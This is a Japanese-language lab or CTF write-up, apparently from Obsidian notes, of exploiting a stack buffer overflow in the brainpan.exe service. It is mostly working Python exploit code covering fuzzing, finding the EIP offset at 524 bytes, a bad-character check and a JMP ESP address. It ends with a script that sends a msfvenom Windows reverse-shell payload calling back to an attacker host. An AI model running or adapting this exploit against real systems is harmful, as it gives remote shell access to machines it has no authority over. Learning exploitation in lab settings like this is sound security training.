

### ファジング

### 動作確認

`nc`で接続したらおｋ、そのあとパスワードを聞かれるっぽい
パスワードが脆弱？
```sh
nc 192.168.40.47 9999
>> hello
```

![[./_pic/Pasted image 20240803224154.png]]
![[./_pic/Pasted image 20240803224247.png]]

#### 脆弱性確認
```python
import socket
import sys
import time

buffer = b"A" * 100
while True:  
  try:  
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('192.168.40.47',9999))
    s.send((buffer))  
    s.close()  
    time.sleep(1)  
    buffer = buffer + b"A"*100
  except Exception as e:
    print(e)  
    print("Fuzzing has crashed at {0} bytes".format(str(len(buffer))))
    sys.exit()

```
![[./_pic/Pasted image 20240803223938.png]]
![[./_pic/Pasted image 20240803223848.png]]

`EIP`も`41414141`で上書きできてるから成功してそう

#### EIP上書きのバイト数を確認


![[./_pic/Pasted image 20240803224452.png]]

```
[+]send buffer
[*]Input EIP value >> 35724134
[+] Exact match at offset 524
[+] EIP is 525 ~ 528 bytes
```
![[./_pic/Pasted image 20240803230025.png]]

`EIP`を上書きできる位置は `525`~`528`byteであるとわかった


### BadCharチェック

```python
import socket
import sys

def generate_badchars():
    badchars  = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    badchars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    badchars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    badchars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    badchars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    badchars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    return badchars

buffer = b"A"*524
buffer += b"B" * 4
buffer += generate_badchars()

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send(buffer)  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
```

FDが右下に来てるからBadCharはなしでよさげ

![[./_pic/Pasted image 20240803232114.png]]

---

### とび先の確定

```
└─$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 
```

まず、`JMP ESP`がありそうなモジュールを探す。
```sh
!mona modules
```
![[./_pic/Pasted image 20240803234748.png]]
この中で、ASLR無効になっているのは `brainpan.exe`のみ。
`JMP ESP`は`brainpan.exe`から探す。
```sh
!mona find -s '\xff\xe4' -m brainpan.exe
```
![[./_pic/Pasted image 20240803234934.png]]

`0x311712f3`が`JMP ESP`であることがわかった。
`EIP`には`f3 12 17 31`を渡せばいい

### Exploit

```python
import socket
import sys
import subprocess

buf = subprocess.check_output(['msfvenom -p windows/shell_reverse_tcp LHOST=192.168.40.50 LPORT=4444 -f raw -a x86 -b "\\x00"'],shell=True)
nop = b"\x90" * 32 
jmp_addr = b"\xf3\x12\x17\x31"
buffer = b"A"*524
payload = buffer + jmp_addr + nop + buf

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send(payload)  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()

```
![[./_pic/Pasted image 20240804000247.png]]

![[./_pic/Pasted image 20240804000229.png]]

![[./_pic/Pasted image 20240804000217.png]]